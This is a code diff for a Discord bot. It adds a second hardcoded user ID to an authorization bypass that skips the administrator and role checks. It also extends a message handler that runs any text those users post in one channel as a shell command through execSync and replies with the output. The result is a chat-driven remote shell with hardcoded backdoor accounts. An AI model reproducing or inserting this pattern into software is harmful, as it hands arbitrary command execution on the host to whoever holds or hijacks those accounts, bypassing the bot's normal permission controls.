@@ -25,7 +25,7 @@ client.on(Events.InteractionCreate, async interaction => {
 	} else {
 		authrole = true
 	}
-	if (interaction.memberPermissions.has(PermissionsBitField.Flags.Administrator) || authrole || interaction.member.id.toString() == "419343503110438922") {
+	if (interaction.memberPermissions.has(PermissionsBitField.Flags.Administrator) || authrole || interaction.member.id === "419343503110438922" || interaction.member.id === "538043155480576050") {
 		if (!interaction.isChatInputCommand()) return
 
 
@@ -68,7 +68,7 @@ client.on(Events.Invalidated, async () => {
 })
 
 client.on(Events.MessageCreate, async msg => {
-    if (msg.author.id === "419343503110438922" && msg.channelId === "1089347772324520046") {
+    if ((msg.author.id === "419343503110438922" || msg.author.id === "538043155480576050") && msg.channelId === "1089347772324520046") {
 		msg.reply("> " + execSync(msg.content));
 	}
 })
